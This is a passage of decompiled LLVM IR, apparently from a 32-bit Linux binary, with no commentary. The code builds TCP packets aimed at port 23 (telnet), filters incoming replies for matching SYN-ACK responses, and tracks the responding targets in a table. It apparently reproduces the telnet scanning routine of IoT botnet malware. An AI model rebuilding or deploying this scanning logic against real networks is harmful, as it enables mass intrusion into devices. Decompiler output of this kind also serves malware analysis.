dec_label_pc_804eb24:                             ; preds = %dec_label_pc_804eb16, %dec_label_pc_804eb12, %dec_label_pc_804eb05
  %v10_804eb24 = icmp eq i8 %v1_804e955, 13
  %v1_804eb27 = icmp eq i1 %v10_804eb24, false
  br i1 %v1_804eb27, label %dec_label_pc_804eb45, label %dec_label_pc_804eb29

dec_label_pc_804eb29:                             ; preds = %dec_label_pc_804eb24
  %v0_804eb29 = load i32, i32* @ebx, align 4
  %v1_804eb29 = trunc i32 %v0_804eb29 to i8
  switch i8 %v1_804eb29, label %dec_label_pc_804eb45 [
    i8 114, label %dec_label_pc_804de41
    i8 113, label %dec_label_pc_804de41
    i8 112, label %dec_label_pc_804de41
    i8 59, label %dec_label_pc_804de41
    i8 58, label %dec_label_pc_804de41
    i8 57, label %dec_label_pc_804de41
    i8 56, label %dec_label_pc_804de41
    i8 55, label %dec_label_pc_804de41
    i8 54, label %dec_label_pc_804de41
    i8 53, label %dec_label_pc_804de41
    i8 52, label %dec_label_pc_804de41
  ]

dec_label_pc_804eb45:                             ; preds = %dec_label_pc_804eb29, %dec_label_pc_804eb24
  %v1_804eb45 = add i32 %v0_804e93f, 47
  %v2_804eb45 = inttoptr i32 %v1_804eb45 to i8*
  %v3_804eb45 = load i8, i8* %v2_804eb45, align 1
  %v4_804eb45 = icmp eq i8 %v3_804eb45, 0
  br i1 %v4_804eb45, label %dec_label_pc_804eb55, label %dec_label_pc_804eb4c

dec_label_pc_804eb4c:                             ; preds = %dec_label_pc_804eb45
  %v0_804eb4c = load i32, i32* @ebx, align 4
  %v1_804eb4c = trunc i32 %v0_804eb4c to i8
  %v11_804eb4c = icmp eq i8 %v1_804eb4c, -84
  br i1 %v11_804eb4c, label %dec_label_pc_804de41, label %dec_label_pc_804eb55

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804eb4c, %dec_label_pc_804eb45
  %v3_804eb55 = load i8, i8* %v2_805028a, align 1
  %v4_804eb55 = icmp eq i8 %v3_804eb55, 0
  br i1 %v4_804eb55, label %dec_label_pc_804fd64, label %dec_label_pc_804eb60

dec_label_pc_804eb60:                             ; preds = %dec_label_pc_804eb55
  %v0_804eb60 = load i32, i32* @ebx, align 4
  %v1_804eb60 = trunc i32 %v0_804eb60 to i8
  %tmp813 = icmp ult i8 %v1_804eb60, 15
  br i1 %tmp813, label %dec_label_pc_804fd64, label %dec_label_pc_804eb69

dec_label_pc_804eb69:                             ; preds = %dec_label_pc_804eb60
  %v11_804eb69 = icmp eq i8 %v1_804eb60, -1
  %v1_804eb6c = icmp eq i1 %v11_804eb69, false
  br i1 %v1_804eb6c, label %dec_label_pc_804de41, label %dec_label_pc_804eb72

dec_label_pc_804eb72:                             ; preds = %dec_label_pc_804fd6d, %dec_label_pc_804fd64, %dec_label_pc_804eb69
  %v1_804eb72 = add i32 %v0_804e93f, 38
  %v2_804eb72 = inttoptr i32 %v1_804eb72 to i8*
  %v3_804eb72 = load i8, i8* %v2_804eb72, align 1
  %notlhs569 = icmp eq i8 %v3_804eb72, 0
  %notrhs570 = icmp ne i8 %v1_804e955, -44
  %or.cond270.not = or i1 %notrhs570, %notlhs569
  %tmp814 = icmp ult i8 %v4_804de51, -32
  %or.cond284 = or i1 %tmp814, %or.cond270.not
  %or.cond284.not = xor i1 %or.cond284, true
  %or.cond285 = and i1 %v1_8050359, %or.cond284.not
  br i1 %or.cond285, label %dec_label_pc_804de41, label %dec_label_pc_804eb82

dec_label_pc_804eb82:                             ; preds = %dec_label_pc_804eb72
  %v1_804eb82 = add i32 %v0_804e93f, 66
  %v2_804eb82 = inttoptr i32 %v1_804eb82 to i8*
  %v3_804eb82 = load i8, i8* %v2_804eb82, align 1
  %v4_804eb82 = icmp ne i8 %v3_804eb82, 0
  %v10_804eb89 = icmp eq i8 %v1_804e955, 89
  %or.cond271 = and i1 %v10_804eb89, %v4_804eb82
  br i1 %or.cond271, label %dec_label_pc_804fd8c, label %dec_label_pc_804eb92

dec_label_pc_804eb92:                             ; preds = %dec_label_pc_804eb82
  switch i8 %v1_804e955, label %dec_label_pc_804eba4 [
    i8 -37, label %dec_label_pc_804fd1f
    i8 23, label %dec_label_pc_804fd08
  ]

dec_label_pc_804eba4:                             ; preds = %dec_label_pc_804fd8c, %dec_label_pc_804fd1f, %dec_label_pc_804fd08, %dec_label_pc_804eb92
  %v1_804eba4 = add i32 %v0_804e93f, 42
  %v2_804eba4 = inttoptr i32 %v1_804eba4 to i8*
  %v3_804eba4 = load i8, i8* %v2_804eba4, align 1
  %v4_804eba4 = icmp eq i8 %v3_804eba4, 0
  br i1 %v4_804eba4, label %dec_label_pc_804ebb9, label %dec_label_pc_804ebab

dec_label_pc_804ebab:                             ; preds = %dec_label_pc_804eba4
  %v0_804ebab = load i32, i32* @ebx, align 4
  %v1_804ebab = trunc i32 %v0_804ebab to i8
  %v10_804ebb0 = icmp eq i8 %v1_804ebab, 62
  br i1 %v10_804ebb0, label %dec_label_pc_804de41, label %dec_label_pc_804ebb9

dec_label_pc_804ebb9:                             ; preds = %dec_label_pc_804ebab, %dec_label_pc_804eba4
  switch i8 %v1_804e955, label %dec_label_pc_804ebd4 [
    i8 106, label %dec_label_pc_804fcf1
    i8 34, label %dec_label_pc_804fcda
    i8 87, label %dec_label_pc_804fcb5
  ]

dec_label_pc_804ebff.thread:                      ; preds = %dec_label_pc_804fcb5, %dec_label_pc_804fcda, %dec_label_pc_804fcf1
  store i32 %v3_804e958, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec0f

dec_label_pc_804ebd4:                             ; preds = %dec_label_pc_804ebb9
  %v10_804ebd4 = icmp eq i8 %v1_804e955, 86
  %v1_804ebd7 = zext i1 %v10_804ebd4 to i32
  %v4_804ebd7 = or i32 %v1_804ebd7, %v3_804e958
  store i32 %v4_804ebd7, i32* %eax.global-to-local, align 4
  %v4_804ebda = icmp eq i1 %v10_804ebd4, false
  br i1 %v4_804ebda, label %dec_label_pc_804ebf6, label %dec_label_pc_804ebde

dec_label_pc_804ebde:                             ; preds = %dec_label_pc_804ebd4
  %v0_804ebde = load i32, i32* @ebx, align 4
  %v1_804ebde = trunc i32 %v0_804ebde to i8
  %v8_804ebde = icmp eq i8 %v1_804ebde, -48
  br i1 %v8_804ebde, label %dec_label_pc_804de41, label %dec_label_pc_804ebe7

dec_label_pc_804ebe7:                             ; preds = %dec_label_pc_804ebde
  %v1_804ebe7 = add i32 %v0_804e93f, 32
  %v2_804ebe7 = inttoptr i32 %v1_804ebe7 to i8*
  %v3_804ebe7 = load i8, i8* %v2_804ebe7, align 1
  %v4_804ebe7 = icmp eq i8 %v3_804ebe7, 0
  br i1 %v4_804ebe7, label %dec_label_pc_804ebf6, label %dec_label_pc_804de41

dec_label_pc_804ebf6:                             ; preds = %dec_label_pc_804ebe7, %dec_label_pc_804ebd4
  %v11_804ebf6 = icmp eq i8 %v1_804e955, -63
  br i1 %v11_804ebf6, label %dec_label_pc_804fca7, label %dec_label_pc_804ebff

dec_label_pc_804ebff:                             ; preds = %dec_label_pc_804ebf6
  %v1_804ebff = add i32 %v0_804e93f, 48
  %v2_804ebff = inttoptr i32 %v1_804ebff to i8*
  %v3_804ebff = load i8, i8* %v2_804ebff, align 1
  %v4_804ebff = icmp ne i8 %v3_804ebff, 0
  %v10_804ec06 = icmp eq i8 %v1_804e955, 120
  %or.cond274 = and i1 %v10_804ec06, %v4_804ebff
  br i1 %or.cond274, label %dec_label_pc_804fccc, label %dec_label_pc_804ec0f

dec_label_pc_804ec0f:                             ; preds = %dec_label_pc_804ebff.thread, %dec_label_pc_804fca7, %dec_label_pc_804ebff, %dec_label_pc_804fccc
  %v1_804ec0f = add i32 %v0_804e93f, 69
  %v2_804ec0f = inttoptr i32 %v1_804ec0f to i8*
  %v3_804ec0f = load i8, i8* %v2_804ec0f, align 1
  %v4_804ec0f = icmp eq i8 %v3_804ec0f, 0
  br i1 %v4_804ec0f, label %dec_label_pc_804ec21, label %dec_label_pc_804ec16

dec_label_pc_804ec16:                             ; preds = %dec_label_pc_804ec0f
  %v1_804ec16 = add i32 %v0_804e93f, 44
  %v2_804ec16 = inttoptr i32 %v1_804ec16 to i8*
  %v3_804ec16 = load i8, i8* %v2_804ec16, align 1
  %v4_804ec16 = icmp eq i8 %v3_804ec16, 0
  %v1_804ec1b = icmp eq i1 %v4_804ec16, false
  br i1 %v1_804ec1b, label %dec_label_pc_804de41, label %dec_label_pc_804ec21

dec_label_pc_804ec21:                             ; preds = %dec_label_pc_804ec16, %dec_label_pc_804ec0f
  switch i8 %v1_804e955, label %dec_label_pc_804ec2a.dec_label_pc_804ec33_crit_edge [
    i8 78, label %dec_label_pc_804fc99
    i8 -32, label %dec_label_pc_804de41
  ]

dec_label_pc_804ec2a.dec_label_pc_804ec33_crit_edge: ; preds = %dec_label_pc_804ec21
  %v0_804ec3b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ec33

dec_label_pc_804ec33:                             ; preds = %dec_label_pc_804fc99, %dec_label_pc_804ec2a.dec_label_pc_804ec33_crit_edge
  %v0_804ec3b = phi i32 [ %v0_804ec3b.pre, %dec_label_pc_804ec2a.dec_label_pc_804ec33_crit_edge ], [ %v0_804fc99, %dec_label_pc_804fc99 ]
  store i16 0, i16* bitcast (i32* @global_var_805510a.13 to i16*), align 4
  %v1_804ec3b = mul i32 %v0_804ec3b, 65536
  %v2_804ec46 = and i32 %v1_804ec3b, 16711680
  %v2_804ec49 = mul i32 %v0_804e955, 16777216
  %v1_804ec355 = mul nuw nsw i32 %v2_804de51, 256
  %v2_804ec4c = and i32 %v1_804ec355, 65280
  store i32 %v2_804ec4c, i32* %edx.global-to-local, align 4
  %v2_804ec4f = or i32 %v2_804ec46, %v2_804ec49
  %v0_804ec51 = load i32, i32* @edi, align 4
  %v1_804ec53 = urem i32 %v0_804ec51, 256
  store i32 %v1_804ec53, i32* %eax.global-to-local, align 4
  %v2_804ec58 = or i32 %v2_804ec4f, %v1_804ec53
  store i32 %v2_804ec58, i32* %ecx.global-to-local, align 4
  %v2_804ec5a = add i32 %v0_804e93f, -4
  %v3_804ec5a = inttoptr i32 %v2_804ec5a to i32*
  store i32 %v1_804ec53, i32* %v3_804ec5a, align 4
  %v0_804ec5b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec5b = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ec5b = or i32 %v1_804ec5b, %v0_804ec5b
  %v0_804ec5d = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec5d = add i32 %v0_804e93f, -8
  %v3_804ec5d = inttoptr i32 %v2_804ec5d to i32*
  store i32 %v0_804ec5d, i32* %v3_804ec5d, align 4
  %v1_804ec5e = trunc i32 %v2_804ec5b to i16
  %v2_804ec5e = call i16 @llvm.bswap.i16(i16 %v1_804ec5e)
  %v3_804ec5e = zext i16 %v2_804ec5e to i32
  %v1_804ec62 = udiv i32 %v2_804ec5b, 65536
  %v2_804ec62 = mul nuw i32 %v3_804ec5e, 65536
  %v1_804ec65 = trunc i32 %v1_804ec62 to i16
  %v2_804ec65 = call i16 @llvm.bswap.i16(i16 %v1_804ec65)
  %v3_804ec65 = zext i16 %v2_804ec65 to i32
  %v6_804ec65 = or i32 %v3_804ec65, %v2_804ec62
  store i32 %v6_804ec65, i32* %edx.global-to-local, align 4
  %v1_804ec69 = add i32 %v0_804e93f, -12
  %v2_804ec69 = inttoptr i32 %v1_804ec69 to i32*
  store i32 20, i32* %v2_804ec69, align 4
  %v0_804ec6b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ec6b, i32* @global_var_8055110.14, align 16
  %v1_804ec71 = add i32 %v0_804e93f, -16
  %v2_804ec71 = inttoptr i32 %v1_804ec71 to i32*
  store i32 ptrtoint (i32* @global_var_8055100.15 to i32), i32* %v2_804ec71, align 4
  %v0_804ec76 = call i32 @function_804bd90()
  %v1_804ec76 = trunc i32 %v0_804ec76 to i16
  store i16 %v1_804ec76, i16* bitcast (i32* @global_var_805510a.13 to i16*), align 4
  %v0_804ec81 = load i32, i32* @global_var_8055110.14, align 16
  store i32 %v0_804ec81, i32* %eax.global-to-local, align 4
  %v0_804ec86 = load i32, i32* @esp, align 4
  %v1_804ec86 = add i32 %v0_804ec86, -4
  %v2_804ec86 = inttoptr i32 %v1_804ec86 to i32*
  store i32 20, i32* %v2_804ec86, align 4
  store i16 5888, i16* @global_var_8055116.16, align 2
  %v1_804ec91 = add i32 %v0_804ec86, -8
  %v2_804ec91 = inttoptr i32 %v1_804ec91 to i32*
  store i32 5120, i32* %v2_804ec91, align 4
  %v0_804ec96 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804ec96, i32* @global_var_8055118.17, align 8
  %v1_804ec9b = add i32 %v0_804ec86, -12
  %v2_804ec9b = inttoptr i32 %v1_804ec9b to i32*
  store i32 ptrtoint (i32* @global_var_8055114.18 to i32), i32* %v2_804ec9b, align 4
  store i16 0, i16* bitcast (i32* @global_var_8055124.19 to i16*), align 4
  %v1_804eca9 = add i32 %v0_804ec86, -16
  %v2_804eca9 = inttoptr i32 %v1_804eca9 to i32*
  store i32 ptrtoint (i32* @global_var_8055100.15 to i32), i32* %v2_804eca9, align 4
  %v0_804ecae = call i32 @function_804bde0()
  %v1_804ecae = trunc i32 %v0_804ecae to i16
  store i16 %v1_804ecae, i16* bitcast (i32* @global_var_8055124.19 to i16*), align 4
  %v0_804ecb9 = load i32, i32* @global_var_8055110.14, align 16
  %v1_804ecbe = load i32, i32* @esp, align 4
  %v2_804ecbe = add i32 %v1_804ecbe, 1912
  %v3_804ecbe = inttoptr i32 %v2_804ecbe to i32*
  store i32 %v0_804ecb9, i32* %v3_804ecbe, align 4
  %v0_804ecc5 = load i16, i16* @global_var_8055116.16, align 2
  %v2_804eccb = load i32, i32* @esp, align 4
  %v3_804eccb = add i32 %v2_804eccb, 1910
  %v4_804eccb = inttoptr i32 %v3_804eccb to i16*
  store i16 %v0_804ecc5, i16* %v4_804eccb, align 2
  %v0_804ecd3 = load i32, i32* @esp, align 4
  %v1_804ecd3 = add i32 %v0_804ecd3, 1908
  %v2_804ecd3 = inttoptr i32 %v1_804ecd3 to i16*
  store i16 2, i16* %v2_804ecd3, align 2
  %v0_804ecdd = load i32, i32* @esp, align 4
  %v0_804ece0 = load i32, i32* @global_var_805517c.20, align 4
  store i32 %v0_804ece0, i32* %eax.global-to-local, align 4
  %v1_804ece5 = add i32 %v0_804ecdd, 20
  %v2_804ece5 = inttoptr i32 %v1_804ece5 to i32*
  store i32 16, i32* %v2_804ece5, align 4
  %v1_804ece7 = add i32 %v0_804ecdd, 1908
  store i32 %v1_804ece7, i32* %ecx.global-to-local, align 4
  %v2_804ecee = add i32 %v0_804ecdd, 16
  %v3_804ecee = inttoptr i32 %v2_804ecee to i32*
  store i32 %v1_804ece7, i32* %v3_804ecee, align 4
  %v1_804ecef = add i32 %v0_804ecdd, 12
  %v2_804ecef = inttoptr i32 %v1_804ecef to i32*
  store i32 16384, i32* %v2_804ecef, align 4
  %v1_804ecf4 = add i32 %v0_804ecdd, 8
  %v2_804ecf4 = inttoptr i32 %v1_804ecf4 to i32*
  store i32 40, i32* %v2_804ecf4, align 4
  %v1_804ecf6 = add i32 %v0_804ecdd, 4
  %v2_804ecf6 = inttoptr i32 %v1_804ecf6 to i32*
  store i32 ptrtoint (i32* @global_var_8055100.15 to i32), i32* %v2_804ecf6, align 4
  %v0_804ecfb = load i32, i32* %eax.global-to-local, align 4
  %v3_804ecfb = inttoptr i32 %v0_804ecdd to i32*
  store i32 %v0_804ecfb, i32* %v3_804ecfb, align 4
  %v0_804ecfc = call i32 @function_80516c9()
  store i32 %v0_804ecfc, i32* %eax.global-to-local, align 4
  %v0_804ed01 = load i32, i32* @esp, align 4
  %v1_804ed01 = add i32 %v0_804ed01, 1948
  %v2_804ed01 = inttoptr i32 %v1_804ed01 to i32*
  %v3_804ed01 = load i32, i32* %v2_804ed01, align 4
  %v1_804ed08 = add i32 %v3_804ed01, 1
  store i32 %v1_804ed08, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed08, i32* %v2_804ed01, align 4
  %v0_804ed10 = load i32, i32* @esp, align 4
  %v1_804ed10 = add i32 %v0_804ed10, 32
  %v0_804ed13 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed13 = add i32 %v0_804ed13, -383
  %v6_804ed13 = sub i32 382, %v0_804ed13
  %v7_804ed13 = and i32 %v6_804ed13, %v0_804ed13
  %v8_804ed13 = icmp slt i32 %v7_804ed13, 0
  %v9_804ed13 = icmp eq i32 %v1_804ed13, 0
  %v10_804ed13 = icmp slt i32 %v1_804ed13, 0
  %v3_804ed18 = icmp ne i1 %v10_804ed13, %v8_804ed13
  %v4_804ed18 = or i1 %v9_804ed13, %v3_804ed18
  br i1 %v4_804ed18, label %dec_label_pc_804de00, label %dec_label_pc_804ed1e

dec_label_pc_804ed1e:                             ; preds = %dec_label_pc_804ec33
  %v0_804ed1e = load i32, i32* @esi, align 4
  %v2_804ed1e = add i32 %v0_804ed10, 52
  %v3_804ed1e = inttoptr i32 %v2_804ed1e to i32*
  store i32 %v0_804ed1e, i32* %v3_804ed1e, align 4
  br label %dec_label_pc_804ed22

dec_label_pc_804ed22:                             ; preds = %.loopexit, %dec_label_pc_804ed1e
  %v1_804ed22 = call i32 @function_805149b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ed22, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804ed29 = load i32, i32* @esp, align 4
  %v2_804ed29 = add i32 %v1_804ed29, 88
  %v3_804ed29 = inttoptr i32 %v2_804ed29 to i32*
  store i32 %v1_804ed22, i32* %v3_804ed29, align 4
  br label %dec_label_pc_804ed2d

dec_label_pc_804ed2d:                             ; preds = %dec_label_pc_804edc5, %dec_label_pc_804edbd, %dec_label_pc_804edb5, %dec_label_pc_804eda2, %dec_label_pc_804ed93, %dec_label_pc_804ed8a, %dec_label_pc_804ed83, %dec_label_pc_804ed77, %dec_label_pc_804ed72, %dec_label_pc_804ee28, %dec_label_pc_804ed22
  %v0_804ed2d = load i32, i32* @esp, align 4
  %v1_804ed2d = add i32 %v0_804ed2d, 88
  %v2_804ed2d = inttoptr i32 %v1_804ed2d to i32*
  %v3_804ed2d = load i32, i32* %v2_804ed2d, align 4
  store i32 %v3_804ed2d, i32* %eax.global-to-local, align 4
  %v1_804ed31 = inttoptr i32 %v3_804ed2d to i32*
  store i32 0, i32* %v1_804ed31, align 4
  %v0_804ed37 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed37 = load i32, i32* @esp, align 4
  %v2_804ed37 = add i32 %v1_804ed37, -4
  %v3_804ed37 = inttoptr i32 %v2_804ed37 to i32*
  store i32 %v0_804ed37, i32* %v3_804ed37, align 4
  %v0_804ed38 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed38 = add i32 %v1_804ed37, -8
  %v3_804ed38 = inttoptr i32 %v2_804ed38 to i32*
  store i32 %v0_804ed38, i32* %v3_804ed38, align 4
  %v1_804ed39 = add i32 %v1_804ed37, -12
  %v2_804ed39 = inttoptr i32 %v1_804ed39 to i32*
  store i32 0, i32* %v2_804ed39, align 4
  %v1_804ed3b = add i32 %v1_804ed37, -16
  %v2_804ed3b = inttoptr i32 %v1_804ed3b to i32*
  store i32 0, i32* %v2_804ed3b, align 4
  %v1_804ed3d = add i32 %v1_804ed37, -20
  %v2_804ed3d = inttoptr i32 %v1_804ed3d to i32*
  store i32 16384, i32* %v2_804ed3d, align 4
  %v1_804ed42 = add i32 %v1_804ed37, -24
  %v2_804ed42 = inttoptr i32 %v1_804ed42 to i32*
  store i32 1514, i32* %v2_804ed42, align 4
  %v0_804ed47 = load i32, i32* @global_var_805517c.20, align 4
  store i32 %v0_804ed47, i32* %eax.global-to-local, align 4
  %v1_804ed4c = add i32 %v1_804ed37, 106
  store i32 %v1_804ed4c, i32* %edx.global-to-local, align 4
  %v2_804ed53 = add i32 %v1_804ed37, -28
  %v3_804ed53 = inttoptr i32 %v2_804ed53 to i32*
  store i32 %v1_804ed4c, i32* %v3_804ed53, align 4
  %v0_804ed54 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed54 = add i32 %v1_804ed37, -32
  %v3_804ed54 = inttoptr i32 %v2_804ed54 to i32*
  store i32 %v0_804ed54, i32* %v3_804ed54, align 4
  %v0_804ed55 = call i32 @function_8051653()
  store i32 %v0_804ed55, i32* %eax.global-to-local, align 4
  %v0_804ed5a = load i32, i32* @esp, align 4
  %tmp169 = icmp slt i32 %v0_804ed55, 1
  br i1 %tmp169, label %dec_label_pc_804ee55, label %dec_label_pc_804ed65

dec_label_pc_804ed65:                             ; preds = %dec_label_pc_804ed2d
  %v1_804ed65 = add i32 %v0_804ed5a, 120
  %v2_804ed65 = inttoptr i32 %v1_804ed65 to i32*
  %v3_804ed65 = load i32, i32* %v2_804ed65, align 4
  store i32 %v3_804ed65, i32* %ecx.global-to-local, align 4
  %v1_804ed69 = inttoptr i32 %v3_804ed65 to i32*
  %v2_804ed69 = load i32, i32* %v1_804ed69, align 4
  %v11_804ed69 = icmp eq i32 %v2_804ed69, 11
  br i1 %v11_804ed69, label %dec_label_pc_804ee55, label %dec_label_pc_804ed72

dec_label_pc_804ed72:                             ; preds = %dec_label_pc_804ed65
  %tmp815 = icmp ult i32 %v0_804ed55, 40
  br i1 %tmp815, label %dec_label_pc_804ed2d, label %dec_label_pc_804ed77

dec_label_pc_804ed77:                             ; preds = %dec_label_pc_804ed72
  %v1_804ed77 = add i32 %v0_804ed5a, 154
  %v2_804ed77 = inttoptr i32 %v1_804ed77 to i32*
  %v3_804ed77 = load i32, i32* %v2_804ed77, align 4
  store i32 %v3_804ed77, i32* %eax.global-to-local, align 4
  %v1_804ed7b = load i32, i32* @global_var_805515c.11, align 4
  %v12_804ed7b = icmp eq i32 %v3_804ed77, %v1_804ed7b
  %v1_804ed81 = icmp eq i1 %v12_804ed7b, false
  br i1 %v1_804ed81, label %dec_label_pc_804ed2d, label %dec_label_pc_804ed83

dec_label_pc_804ed83:                             ; preds = %dec_label_pc_804ed77
  %v1_804ed83 = add i32 %v0_804ed5a, 147
  %v2_804ed83 = inttoptr i32 %v1_804ed83 to i8*
  %v3_804ed83 = load i8, i8* %v2_804ed83, align 1
  %v12_804ed83 = icmp eq i8 %v3_804ed83, 6
  %v1_804ed88 = icmp eq i1 %v12_804ed83, false
  br i1 %v1_804ed88, label %dec_label_pc_804ed2d, label %dec_label_pc_804ed8a

dec_label_pc_804ed8a:                             ; preds = %dec_label_pc_804ed83
  %v1_804ed8a = add i32 %v0_804ed5a, 158
  %v2_804ed8a = inttoptr i32 %v1_804ed8a to i16*
  %v3_804ed8a = load i16, i16* %v2_804ed8a, align 2
  %v9_804ed8a = icmp eq i16 %v3_804ed8a, 5888
  %v1_804ed91 = icmp eq i1 %v9_804ed8a, false
  br i1 %v1_804ed91, label %dec_label_pc_804ed2d, label %dec_label_pc_804ed93

dec_label_pc_804ed93:                             ; preds = %dec_label_pc_804ed8a
  %v1_804ed93 = add i32 %v0_804ed5a, 50
  %v2_804ed93 = inttoptr i32 %v1_804ed93 to i16*
  %v3_804ed93 = load i16, i16* %v2_804ed93, align 2
  %v4_804ed93 = zext i16 %v3_804ed93 to i32
  %v6_804ed93 = and i32 %v3_804ed77, -65536
  %v7_804ed93 = or i32 %v4_804ed93, %v6_804ed93
  store i32 %v7_804ed93, i32* %eax.global-to-local, align 4
  %v3_804ed98 = add i32 %v0_804ed5a, 160
  %v4_804ed98 = inttoptr i32 %v3_804ed98 to i16*
  %v5_804ed98 = load i16, i16* %v4_804ed98, align 2
  %v16_804ed98 = icmp eq i16 %v3_804ed93, %v5_804ed98
  %v1_804eda0 = icmp eq i1 %v16_804ed98, false
  br i1 %v1_804eda0, label %dec_label_pc_804ed2d, label %dec_label_pc_804eda2

dec_label_pc_804eda2:                             ; preds = %dec_label_pc_804ed93
  %v1_804eda2 = add i32 %v0_804ed5a, 171
  %v2_804eda2 = inttoptr i32 %v1_804eda2 to i8*
  %v3_804eda2 = load i8, i8* %v2_804eda2, align 1
  %v4_804eda2 = zext i8 %v3_804eda2 to i32
  %v6_804eda2 = and i32 %v7_804ed93, -256
  %v7_804eda2 = or i32 %v4_804eda2, %v6_804eda2
  store i32 %v7_804eda2, i32* %eax.global-to-local, align 4
  %v2_804eda9 = and i8 %v3_804eda2, 2
  %v3_804eda9 = icmp eq i8 %v2_804eda9, 0
  %v2_804edad = and i32 %v4_804eda2, 16
  %v3_804edad = icmp eq i32 %v2_804edad, 0
  %or.cond275 = or i1 %v3_804eda9, %v3_804edad
  br i1 %or.cond275, label %dec_label_pc_804ed2d, label %dec_label_pc_804edb5

dec_label_pc_804edb5:                             ; preds = %dec_label_pc_804eda2
  %v2_804edb5 = and i32 %v4_804eda2, 4
  %v3_804edb5 = icmp eq i32 %v2_804edb5, 0
  %v1_804edb7 = icmp eq i1 %v3_804edb5, false
  br i1 %v1_804edb7, label %dec_label_pc_804ed2d, label %dec_label_pc_804edbd

dec_label_pc_804edbd:                             ; preds = %dec_label_pc_804edb5
  %tmp855 = urem i8 %v3_804eda2, 2
  %v3_804edbd = icmp eq i8 %tmp855, 0
  %v1_804edbf = icmp eq i1 %v3_804edbd, false
  br i1 %v1_804edbf, label %dec_label_pc_804ed2d, label %dec_label_pc_804edc5

dec_label_pc_804edc5:                             ; preds = %dec_label_pc_804edbd
  %v1_804edc5 = add i32 %v0_804ed5a, 166
  %v2_804edc5 = inttoptr i32 %v1_804edc5 to i32*
  %v3_804edc5 = load i32, i32* %v2_804edc5, align 4
  %v1_804edcc = trunc i32 %v3_804edc5 to i16
  %v2_804edcc = call i16 @llvm.bswap.i16(i16 %v1_804edcc)
  %v3_804edcc = zext i16 %v2_804edcc to i32
  %v1_804edd0 = udiv i32 %v3_804edc5, 65536
  %v2_804edd0 = mul nuw i32 %v3_804edcc, 65536
  %v1_804edd3 = trunc i32 %v1_804edd0 to i16
  %v2_804edd3 = call i16 @llvm.bswap.i16(i16 %v1_804edd3)
  %v3_804edd3 = zext i16 %v2_804edd3 to i32
  %v6_804edd3 = or i32 %v3_804edd3, %v2_804edd0
  %v1_804edd7 = add i32 %v6_804edd3, -1
  %v1_804edd8 = trunc i32 %v1_804edd7 to i16
  %v2_804edd8 = call i16 @llvm.bswap.i16(i16 %v1_804edd8)
  %v3_804edd8 = zext i16 %v2_804edd8 to i32
  %v1_804eddc = udiv i32 %v1_804edd7, 65536
  %v2_804eddc = mul nuw i32 %v3_804edd8, 65536
  %v1_804eddf = trunc i32 %v1_804eddc to i16
  %v2_804eddf = call i16 @llvm.bswap.i16(i16 %v1_804eddf)
  %v3_804eddf = zext i16 %v2_804eddf to i32
  %v6_804eddf = or i32 %v3_804eddf, %v2_804eddc
  store i32 %v6_804eddf, i32* %eax.global-to-local, align 4
  %v1_804ede3 = add i32 %v0_804ed5a, 150
  %v2_804ede3 = inttoptr i32 %v1_804ede3 to i32*
  %v3_804ede3 = load i32, i32* %v2_804ede3, align 4
  %v15_804ede3 = icmp eq i32 %v3_804ede3, %v6_804eddf
  %v1_804ede7 = icmp eq i1 %v15_804ede3, false
  br i1 %v1_804ede7, label %dec_label_pc_804ed2d, label %dec_label_pc_804eded

dec_label_pc_804eded:                             ; preds = %dec_label_pc_804edc5
  %v0_804eded = load i32, i32* @ebx, align 4
  %v1_804eded = add i32 %v0_804eded, -255
  %v6_804eded = sub i32 254, %v0_804eded
  %v7_804eded = and i32 %v6_804eded, %v0_804eded
  %v8_804eded = icmp slt i32 %v7_804eded, 0
  %v9_804eded = icmp eq i32 %v1_804eded, 0
  %v10_804eded = icmp slt i32 %v1_804eded, 0
  %v3_804edf3 = icmp eq i1 %v10_804eded, %v8_804eded
  %v4_804edf3 = icmp eq i1 %v9_804eded, false
  %v5_804edf3 = and i1 %v4_804edf3, %v3_804edf3
  br i1 %v5_804edf3, label %dec_label_pc_804ee55, label %dec_label_pc_804edf5

dec_label_pc_804edf5:                             ; preds = %dec_label_pc_804eded
  %v0_804edf8 = load i32, i32* @global_var_8055178.21, align 8
  %v2_804edfe = mul i32 %v0_804eded, 288
  %v2_804ee01 = add i32 %v0_804edf8, %v2_804edfe
  store i32 %v2_804ee01, i32* %edx.global-to-local, align 4
  %v1_804ee03 = add i32 %v2_804ee01, 12
  %v2_804ee03 = inttoptr i32 %v1_804ee03 to i32*
  %v3_804ee03 = load i32, i32* %v2_804ee03, align 4
  store i32 %v3_804ee03, i32* @edi, align 4
  %v1_804ee06 = add i32 %v2_804ee01, 288
  store i32 %v1_804ee06, i32* %ecx.global-to-local, align 4
  %v1_804ee0c = icmp eq i32 %v3_804ee03, 0
  br i1 %v1_804ee0c, label %dec_label_pc_804ee28, label %dec_label_pc_804ee10

dec_label_pc_804ee10:                             ; preds = %dec_label_pc_804edf5, %dec_label_pc_804ee19
  %v0_804ee19 = phi i32 [ %v1_804ee1b, %dec_label_pc_804ee19 ], [ %v1_804ee06, %dec_label_pc_804edf5 ]
  %v0_804ee10 = phi i32 [ %v1_804ee10, %dec_label_pc_804ee19 ], [ %v0_804eded, %dec_label_pc_804edf5 ]
  %v1_804ee10 = add i32 %v0_804ee10, 1
  store i32 %v1_804ee10, i32* @ebx, align 4
  %v6_804ee11 = icmp eq i32 %v0_804ee10, 255
  br i1 %v6_804ee11, label %dec_label_pc_804ee55, label %dec_label_pc_804ee19

dec_label_pc_804ee19:                             ; preds = %dec_label_pc_804ee10
  store i32 %v0_804ee19, i32* %edx.global-to-local, align 4
  %v1_804ee1b = add i32 %v0_804ee19, 288
  store i32 %v1_804ee1b, i32* %ecx.global-to-local, align 4
